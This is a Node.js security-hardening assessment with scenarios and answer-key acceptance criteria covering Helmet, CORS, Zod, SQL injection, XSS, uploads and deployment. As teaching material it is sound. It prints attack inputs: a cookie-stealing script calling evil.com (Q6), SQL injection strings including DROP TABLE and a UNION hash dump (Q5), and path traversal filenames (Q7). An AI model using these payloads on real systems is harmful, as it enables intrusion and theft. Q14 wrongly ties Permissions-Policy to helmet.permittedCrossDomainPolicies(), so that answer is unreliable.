# Day 40 Assessment — Production Hardening · Validation · Security Headers · File Uploads

**Theme:** You are preparing a Node.js API for a security audit before enterprise customers can sign contracts. The auditors will pentest the API and check security headers. Nothing can ship that fails OWASP Top 10 checks.

**Scoring:** 0–4 re-study · 5–9 progressing · 10–12 solid · 13–15 ready to advance

---

### Q1 — Helmet Headers ⭐

**Scenario:** The pentest report flags "missing security headers" on every endpoint. The auditor's note says: "No Helmet or equivalent middleware detected. This is an automatic fail on our checklist."

**Task:** Name five HTTP response headers that Helmet sets by default. For each, explain what attack it prevents and give an example of how the attack would work without the header.

**Acceptance Criteria:**
- [ ] `X-Content-Type-Options: nosniff` — prevents MIME-type sniffing attacks where the browser executes a response as JavaScript even if the server declares it as `text/plain`; example: an uploaded `.txt` file containing `<script>alert(1)</script>` being executed by IE/older browsers
- [ ] `X-Frame-Options: DENY` (or `SAMEORIGIN`) — prevents clickjacking: embedding your app in an invisible `<iframe>` on a malicious site and tricking users into clicking hidden buttons
- [ ] `X-XSS-Protection: 0` — Helmet actually *disables* this legacy header in modern configs because the browser's XSS auditor had its own bypasses; the correct protection is CSP
- [ ] `Content-Security-Policy` — restricts which scripts, styles, and resources the browser may load; prevents XSS by blocking inline scripts and scripts from untrusted origins
- [ ] `Referrer-Policy: no-referrer` (or `strict-origin-when-cross-origin`) — prevents the full URL (which may contain sensitive query params like reset tokens) from appearing in `Referer` headers sent to third-party domains
- [ ] `Strict-Transport-Security` (HSTS) — tells browsers to only access the site over HTTPS for a specified duration; prevents SSL-stripping attacks where an attacker downgrades the connection to HTTP
- [ ] States that Helmet is applied as `app.use(helmet())` before all routes and does not require configuration for default protections

---

### Q2 — CORS Misconfiguration ⭐

**Scenario:** The original developer set `app.use(cors({ origin: '*', credentials: true }))` to "make CORS issues go away." The code has been running in production for 3 months.

**Task:** Explain what's wrong with `origin: '*'` combined with `credentials: true`. Explain why the browser rejects this combination. Show the correct CORS configuration for a production SPA hosted at `https://app.example.com`.

**Acceptance Criteria:**
- [ ] `origin: '*'` is a wildcard that allows any domain to make requests to your API
- [ ] `credentials: true` tells the browser to include cookies and Authorization headers in cross-origin requests
- [ ] The browser blocks `origin: '*'` with `credentials: true` by the CORS spec: a wildcard origin cannot be used when credentials are included — the browser throws `Access-Control-Allow-Origin cannot be a wildcard when credentials mode is include`
- [ ] Security reason: if wildcard + credentials were allowed, any malicious website could make authenticated API calls using the victim's cookies
- [ ] Correct config:
  ```js
  cors({
    origin: ['https://app.example.com'],
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  })
  ```
- [ ] The `origin` must be an exact match list (or a function that validates against an allowlist) — never a regex that can be bypassed
- [ ] States that CORS is enforced by browsers, not servers — direct API calls (Postman, curl, server-to-server) ignore CORS entirely; CORS is not a substitute for server-side authentication

---

### Q3 — Zod Validation ⭐

**Scenario:** A TypeScript service casts `req.body as CreateUserDto` and uses the values directly in database queries. The developer says "TypeScript guarantees the types." A security reviewer disagrees.

**Task:** Explain why TypeScript type assertions (`as`) are unsafe at runtime. Explain why Zod runtime validation is required. Show a Zod schema for `CreateUserDto` and how to use it in a route handler.

**Acceptance Criteria:**
- [ ] TypeScript types are erased at compile time — at runtime, `req.body` is a plain JavaScript object with no type guarantees; any client can send any shape
- [ ] `as CreateUserDto` is a developer assertion to the compiler, not a runtime check — TypeScript trusts you; the compiler does not insert any validation code
- [ ] An attacker can send `{ email: null, role: 'admin', __proto__: { isAdmin: true } }` — TypeScript won't catch this, but Zod will
- [ ] Zod schema example:
  ```ts
  const CreateUserSchema = z.object({
    name: z.string().min(1).max(100),
    email: z.string().email(),
    role: z.enum(['user', 'manager']),
  });
  ```
- [ ] Route handler usage: `const parsed = CreateUserSchema.safeParse(req.body)` — if `!parsed.success`, return `422` with `parsed.error.flatten()` errors; if success, use `parsed.data` (fully typed and validated)
- [ ] `parsed.data` is Zod's safe output — it strips unknown fields by default, preventing mass assignment
- [ ] States that Zod validation should run before any business logic and before any database operation — validate at the API boundary

---

### Q4 — Rate Limiting Strategy ⭐

**Scenario:** The rate limiter is configured as `windowMs: 15 * 60 * 1000, max: 100`. The auditor notes this allows bursting: a client can send 100 requests in the first second, then is blocked for 15 minutes, then repeats.

**Task:** Explain the fixed window limitation and the burst problem. Explain what sliding window rate limiting is and why it is more accurate. Identify a library that provides sliding window rate limiting in Node.js.

**Acceptance Criteria:**
- [ ] Fixed window: the counter resets at fixed intervals (e.g., every 15 minutes on the clock) — at the window boundary, a client can send 100 requests at 14:59 and 100 more at 15:00 = 200 requests in 2 seconds
- [ ] Burst attack: an attacker synchronizes requests to the window boundary, effectively doubling the allowed rate
- [ ] Sliding window: the window moves with each request — "you are allowed 100 requests in the last 15 minutes" evaluated at the exact time of each request; no boundary-burst is possible
- [ ] Token bucket / leaky bucket algorithms achieve similar smoothing: tokens are added at a fixed rate; each request consumes a token; excess requests are rejected
- [ ] Redis-based sliding window: `ioredis` + `rate-limiter-flexible` library supports sliding window with Redis backend; works across multiple server instances (unlike in-memory `express-rate-limit`)
- [ ] Different limits per endpoint: auth endpoints (5/min), write endpoints (30/min), read endpoints (200/min) — apply per-route middleware with different configs
- [ ] States that rate limiting without a shared store (Redis) doesn't work in a multi-instance deployment — each instance has its own counter and the effective limit is `max × instances`

---

### Q5 — SQL Injection via Validation ⭐⭐

**Scenario:** The legacy user search endpoint builds a SQL query by string interpolation: `SELECT * FROM users WHERE email = '${req.body.email}'`.

**Task:** Show a concrete SQL injection attack against this query. Explain exactly what the database executes. Show why parameterized queries (using Prisma or `pg` with `$1`) prevent it.

**Acceptance Criteria:**
- [ ] Attack payload: `email = "' OR '1'='1"` → query becomes `SELECT * FROM users WHERE email = '' OR '1'='1'` → returns all users
- [ ] Destructive payload: `email = "'; DROP TABLE users; --"` → `SELECT * FROM users WHERE email = ''; DROP TABLE users; --'` → deletes the table (in databases that support stacked queries)
- [ ] Data exfiltration: `email = "' UNION SELECT id, password_hash, null FROM users --"` → returns password hashes in the email response column
- [ ] Parameterized query with `pg`: `await db.query('SELECT * FROM users WHERE email = $1', [req.body.email])` — the driver sends the query and the parameter separately; the database never interpolates user input into the SQL string
- [ ] Prisma equivalent: `await prisma.user.findFirst({ where: { email: req.body.email } })` — Prisma always uses parameterized queries under the hood
- [ ] Why parameterization works: user input is treated as a data value, never as SQL syntax — the parser cannot be tricked because parsing happens before the parameter is substituted
- [ ] States that ORMs and query builders do NOT automatically prevent injection if you use raw query interpolation (e.g., `prisma.$queryRaw` with template literals) — parameterization must be explicit

---

### Q6 — Input Sanitization ⭐⭐

**Scenario:** Users can set a bio that renders as HTML on their public profile. A security researcher submits `<script>fetch('https://evil.com?c='+document.cookie)</script>` as their bio and now every user who views the profile has their session cookie stolen.

**Task:** Explain what stored XSS is and why sanitizing only at display time is insufficient. Explain why you should sanitize HTML before storing. Name the recommended server-side sanitization library.

**Acceptance Criteria:**
- [ ] Stored XSS: malicious JavaScript is saved to the database and executed every time any user views the content — unlike reflected XSS (which affects one victim per attack), stored XSS scales to all viewers
- [ ] Sanitizing only at display time is risky because: other systems may read the raw value from the DB (emails, mobile apps, exports) and render it without sanitization; the raw dangerous payload remains queryable in the DB
- [ ] Sanitize before storing: strip dangerous tags and attributes from user-supplied HTML before the `INSERT` — the DB contains only safe content that can be rendered anywhere
- [ ] Server-side sanitization: `DOMPurify` can be run server-side via `jsdom`: `const clean = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: ['b', 'i', 'em', 'a'], ALLOWED_ATTR: ['href'] })`
- [ ] Alternatively, use `sanitize-html` npm package which is designed for Node.js: `sanitizeHtml(dirty, { allowedTags: ['b', 'i', 'a'], allowedAttributes: { 'a': ['href'] } })`
- [ ] For APIs that never return HTML (pure JSON APIs), the safest policy is to reject any input that contains HTML tags entirely (`z.string().refine(s => !/<[^>]+>/.test(s))` in Zod) — don't sanitize, just reject
- [ ] CSP (`Content-Security-Policy: default-src 'self'`) provides defense-in-depth but is not a substitute for sanitization — assume CSP can be bypassed

---

### Q7 — File Upload Security ⭐⭐

**Scenario:** The new document upload feature (`POST /api/documents`) accepts any file from authenticated users. Within a week, an attacker uploads a PHP shell script disguised as `invoice.pdf` and the server begins executing it.

**Task:** List and explain five security checks required for safe file upload. Address: MIME type validation, max size, filename sanitization, path traversal, and serving location.

**Acceptance Criteria:**
- [ ] Check 1 — MIME type validation: read the actual file bytes to detect the true type using `file-type` npm package (`await fileTypeFromBuffer(buffer)`) — do NOT trust `Content-Type` header or file extension alone; both are attacker-controlled
- [ ] Check 2 — File size limit: enforce both middleware-level limit (`multer({ limits: { fileSize: 10 * 1024 * 1024 } })`) and application-level check — reject before buffering the full payload to prevent OOM
- [ ] Check 3 — Filename sanitization: replace the original filename with a UUID: `const safeFilename = crypto.randomUUID() + '.pdf'` — user-provided filenames are never used as filesystem paths
- [ ] Check 4 — Path traversal prevention: never construct filesystem paths from user input; a filename like `../../etc/passwd` or `../config/production.env` would escape the upload directory if used directly
- [ ] Check 5 — Storage location: store uploads outside the web root (e.g., `S3`, or a directory not served by `express.static`) — files in the web root can be accessed by URL directly, bypassing auth checks; serve through a signed URL or a streaming endpoint that checks permissions
- [ ] Bonus check: scan for malware using a service like ClamAV or a cloud scanning API before making the file accessible
- [ ] States that even validating MIME type is insufficient if the server executes files with dangerous extensions — disable execution permissions on the upload directory entirely

---

### Q8 — Environment Variable Validation ⭐⭐

**Scenario:** The staging server starts successfully with `DB_URL=undefined` and `JWT_SECRET=undefined` because the `.env` file was missing. The app runs but logs DB connection errors silently and signs all JWTs with the string `"undefined"`.

**Task:** Explain why `process.env.DB_URL ?? 'fallback'` is dangerous in production. Show how to validate all required env vars on startup with Zod. Explain why crashing fast with a clear error is better than silent fallback.

**Acceptance Criteria:**
- [ ] `process.env.VAR` returns `undefined` if the variable is not set — `?? 'fallback'` silently substitutes a fallback value, hiding the misconfiguration
- [ ] `JWT_SECRET` defaulting to `"undefined"` means every server instance uses the same predictable secret — an attacker can forge JWTs by knowing the secret is the string `"undefined"`
- [ ] `DB_URL` defaulting to a local SQLite fallback might silently use a development database in production, exposing or corrupting the wrong data
- [ ] Zod validation on startup:
  ```ts
  const EnvSchema = z.object({
    NODE_ENV: z.enum(['development', 'staging', 'production']),
    PORT: z.string().regex(/^\d+$/).transform(Number),
    DB_URL: z.string().url(),
    JWT_SECRET: z.string().min(32),
    REDIS_URL: z.string().url(),
  });
  const env = EnvSchema.parse(process.env);
  ```
- [ ] If `parse()` throws (missing or invalid var), log the Zod error with field names and `process.exit(1)` — crash before the HTTP server starts
- [ ] Fail fast principle: a server that crashes on startup with `Missing required env var: JWT_SECRET` is far easier to debug than one that starts and silently misbehaves
- [ ] The validated `env` object should be exported and used throughout the codebase instead of accessing `process.env` directly — TypeScript then knows the types are guaranteed

---

### Q9 — Error Response Leaking ⭐⭐

**Scenario:** The auditor uses an automated scanner and discovers that 500 errors return full stack traces including file paths (`/home/ubuntu/app/src/services/UserService.ts:87`), SQL queries (`SELECT * FROM users WHERE id = ...`), and internal hostnames (`internal-db.prod.example.com:5432`).

**Task:** List five categories of information that must never appear in error responses. Implement a sanitizing error handler that sends safe responses externally while logging full details internally.

**Acceptance Criteria:**
- [ ] Never expose in responses: (1) stack traces with file paths and line numbers, (2) raw SQL queries, (3) internal hostnames, IPs, or port numbers, (4) library/framework version strings, (5) database column names or schema details
- [ ] Sanitizing error handler pattern:
  ```ts
  app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
    logger.error({ err, requestId: req.requestId }); // full detail to log aggregator
    if (err instanceof AppError && err.isOperational) {
      return res.status(err.statusCode).json({ error: { code: err.code, message: err.message } });
    }
    res.status(500).json({ error: { code: 'INTERNAL_ERROR', message: 'An unexpected error occurred' } });
  });
  ```
- [ ] `isOperational: true` errors (ValidationError, NotFoundError) are safe to surface — they contain only user-facing messages
- [ ] `isOperational: false` or unknown errors: send a generic `500` response — full error details go only to the internal log (Datadog, CloudWatch, etc.)
- [ ] Error responses must NOT include `err.stack` — remove it before any serialization: `delete err.stack` or use a custom serializer
- [ ] In development (`NODE_ENV=development`), consider returning stack traces for developer convenience — check the env var before including
- [ ] Request ID (`req.requestId`) ties the sanitized client response to the full internal log entry — support engineers can correlate without exposing internals to clients

---

### Q10 — Dependency Security ⭐⭐

**Scenario:** `npm audit` reports a high-severity vulnerability in `axios@0.21.1` (a transitive dependency of a logging library). The fix is available in `axios@0.21.4`. The logging library has not yet released an update.

**Task:** Walk through the decision framework for triaging this vulnerability. Cover: severity vs exploitability, whether the fix is available, and what to do if no fix exists.

**Acceptance Criteria:**
- [ ] Step 1 — Read the CVE: check the actual vulnerability description; "high severity" does not mean "high exploitability in your context" — e.g., a SSRF in `axios` used only for internal calls behind a VPN may not be exploitable in your environment
- [ ] Step 2 — Check exploitability: is the vulnerable code path reachable in your usage? If the vulnerability requires sending crafted HTTP responses to `axios` and you only call trusted internal APIs, the practical risk is lower
- [ ] Step 3 — Fix available: if `axios@0.21.4` fixes it, use `npm overrides` (npm 8+) to force the patched version:
  ```json
  "overrides": { "axios": "^0.21.4" }
  ```
- [ ] Step 4 — Test after override: run the full test suite; transitive dependency overrides can introduce incompatibilities
- [ ] Step 5 — No fix available: assess timeline (is the library maintainer working on it?); evaluate switching to an alternative library; or isolate the vulnerable call in a sandboxed child process
- [ ] Document the decision: create a ticket with CVE ID, risk assessment, chosen mitigation, and a review date (30–90 days) to revisit if no upstream fix arrives
- [ ] States that `npm audit --audit-level=critical` in CI fails the build only on critical vulnerabilities — prevents every minor advisory from blocking deploys while still catching critical issues

---

### Q11 — Content-Security-Policy ⭐⭐

**Scenario:** The auditor notes the API returns HTML error pages (from an unhandled Express error) that could be vectors for XSS. Additionally, the CSP header is missing entirely.

**Task:** Explain what CSP prevents. Write a strict CSP header suitable for an API-only server that never serves HTML to browsers. Explain what each directive does.

**Acceptance Criteria:**
- [ ] CSP prevents: XSS (by restricting which scripts execute), data injection attacks (by restricting which resources can be loaded), and clickjacking supplement (frame ancestors)
- [ ] For an API-only server (no HTML): `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`
- [ ] `default-src 'none'`: blocks all resource types (scripts, styles, images, fonts, XHR, frames) by default — the most restrictive possible policy
- [ ] `frame-ancestors 'none'`: prevents any page from embedding this API response in an iframe — stronger than `X-Frame-Options: DENY` and supersedes it in modern browsers
- [ ] Why apply CSP to an API: HTML error pages (Express's default error output) can be rendered by browsers and could execute injected scripts without CSP; CSP blocks even those
- [ ] States that `default-src 'none'` with no other directives means even legitimate fetch calls from your SPA would be blocked — but since this is an API server (not serving the SPA), that's correct; the SPA has its own CSP
- [ ] Notes that `report-uri /csp-violations` can be added to collect CSP violation reports without blocking — useful for auditing before enforcing

---

### Q12 — Mass Assignment Vulnerability ⭐⭐⭐

**Scenario:** The profile update endpoint does `await User.update(req.body)` and returns the updated user. A penetration tester sends `{ "name": "Alice", "role": "admin", "isVerified": true }` and becomes an admin without any privilege escalation check.

**Task:** Explain the mass assignment vulnerability. Show the attack payload. Fix it using Zod `.pick()` to whitelist only allowed fields. Show that the fix prevents role escalation.

**Acceptance Criteria:**
- [ ] Mass assignment: the application blindly passes user-controlled input directly to the database update layer — an attacker can set any model field, including internal fields like `role`, `isAdmin`, `isVerified`, `balance`
- [ ] Attack payload: `PATCH /api/users/me` with body `{ "name": "Alice", "role": "admin", "isVerified": true, "creditBalance": 999999 }` — all fields are updated if no whitelist exists
- [ ] Fix with Zod:
  ```ts
  const UpdateProfileSchema = z.object({
    name: z.string().min(1).max(100).optional(),
    email: z.string().email().optional(),
    bio: z.string().max(500).optional(),
  });
  const safe = UpdateProfileSchema.parse(req.body);
  await User.update({ where: { id: req.user.id }, data: safe });
  ```
- [ ] `z.object({...}).parse()` strips all keys not in the schema by default — `role`, `isVerified`, `balance` are silently dropped even if the attacker sends them
- [ ] The update only touches `{ name, email, bio }` — no other fields are reachable regardless of what the client sends
- [ ] States the general rule: never use `req.body` directly in a database operation; always pass through a validated schema that has an explicit field list
- [ ] Applies to all HTTP methods: mass assignment is equally possible on POST (create), PUT (replace), and PATCH (update)

---

### Q13 — DoS via Large Payload ⭐⭐⭐

**Scenario:** A load test reveals that 50 concurrent requests each with a 50 MB body exhausts the server's memory (2.5 GB of pending buffers) and causes OOM. The current config is `app.use(express.json())` with no limit.

**Task:** Explain why an unlimited `express.json()` is a DoS vector. Implement tiered size limits: 10 KB default, 5 MB for `/api/upload`. Show how to monitor for `request entity too large` errors.

**Acceptance Criteria:**
- [ ] Node.js buffers the entire request body in memory before JSON.parse runs — with no limit, an attacker can force the server to allocate arbitrarily large buffers
- [ ] At 50 concurrent × 50 MB = 2.5 GB buffered before a single request is processed or rejected
- [ ] Fix — global default: `app.use(express.json({ limit: '10kb' }))` — rejects bodies over 10 KB with `413 Request Entity Too Large` before buffering completes
- [ ] Override for upload route:
  ```ts
  router.post('/upload', express.json({ limit: '5mb' }), uploadHandler);
  ```
- [ ] The route-level middleware overrides the global one for that specific route — all other routes are still limited to 10 KB
- [ ] Monitoring: catch `413` errors in the error handler and log them with `{ ip: req.ip, path: req.path, size: req.headers['content-length'] }` — a spike in 413s signals an active DoS probe
- [ ] Additional defense: set `express.json({ strict: true })` to reject non-object/array top-level JSON values, preventing some edge-case parser attacks

---

### Q14 — Security Headers Audit ⭐⭐⭐

**Scenario:** A follow-up pentest after adding Helmet still flags three issues: (1) HSTS is missing, (2) no `Permissions-Policy` header, (3) the CSP allows `'unsafe-inline'` for scripts.

**Task:** Explain why each issue matters. Fix all three in code. Show the corrected Helmet configuration.

**Acceptance Criteria:**
- [ ] HSTS missing: without `Strict-Transport-Security`, the browser may still allow HTTP connections — an SSL-stripping MITM attack can intercept the first HTTP request before the redirect to HTTPS; HSTS tells the browser to always use HTTPS, even before the first request
  ```js
  helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true })
  ```
- [ ] `Permissions-Policy` missing: without this header, the browser grants the page (and any embedded content) access to powerful APIs: camera, microphone, geolocation, payment; set:
  ```
  Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
  ```
  Helmet provides this via `helmet.permittedCrossDomainPolicies()` — or set it manually with `res.setHeader`
- [ ] `'unsafe-inline'` in CSP: allows inline `<script>` blocks — the entire point of CSP is defeated because XSS payloads can be injected inline; replace with a nonce-based approach:
  ```
  Content-Security-Policy: script-src 'nonce-<random>' 'strict-dynamic'
  ```
  or for an API-only server: `script-src 'none'`
- [ ] Complete corrected Helmet config shown as a single `helmet({ ... })` call with all three overrides applied
- [ ] States that `preload: true` in HSTS allows submission to the browser preload list — the domain is hardcoded to HTTPS in browsers before any user visits; requires commitment (cannot be undone quickly)
- [ ] Notes that `includeSubDomains: true` means ALL subdomains must also be HTTPS — verify there are no HTTP-only subdomains before enabling

---

### Q15 — Zero-Downtime Deployment ⭐⭐⭐

**Scenario:** The current deployment process restarts the Node.js server, causing ~3 seconds of downtime during each deploy. Enterprise customers have an SLA requiring 99.9% uptime (8.7 hours maximum downtime per year). The team needs zero-downtime deploys.

**Task:** Explain how graceful shutdown + health checks enable zero-downtime deployments. Walk through the exact sequence from new instance start to old instance exit. Explain why the order of each step is critical.

**Acceptance Criteria:**
- [ ] Step 1 — New instance starts: the new version boots and begins its health check warm-up (connects to DB, Redis, loads caches)
- [ ] Step 2 — Health check passes: `GET /health` on the new instance returns `200` with `{ status: 'ok', db: 'connected', redis: 'connected' }` — the load balancer now considers it ready
- [ ] Step 3 — Load balancer routes traffic to new instance: new requests begin reaching the new instance; the old instance continues serving in-flight requests
- [ ] Step 4 — Load balancer removes old instance: no new connections are sent to the old instance; it is removed from the rotation (not killed yet)
- [ ] Step 5 — SIGTERM sent to old instance: the process orchestrator (Kubernetes, ECS) sends `SIGTERM`; the old instance's SIGTERM handler calls `server.close()` to stop accepting new connections
- [ ] Step 6 — Old instance drains: `server.close()` waits for all active connections (in-flight HTTP requests) to complete — no request is dropped mid-flight
- [ ] Step 7 — Cleanup and exit: after drain, the DB pool and Redis clients are closed cleanly, then `process.exit(0)`
- [ ] Order matters: if `process.exit()` is called before drain, in-flight requests are terminated abruptly; if the DB pool closes before drain, those requests fail with DB errors; the health check must pass before traffic shifts (no partial-start traffic)
- [ ] Kubernetes `terminationGracePeriodSeconds: 30` and `readinessProbe` are the configuration counterparts to this application-level logic
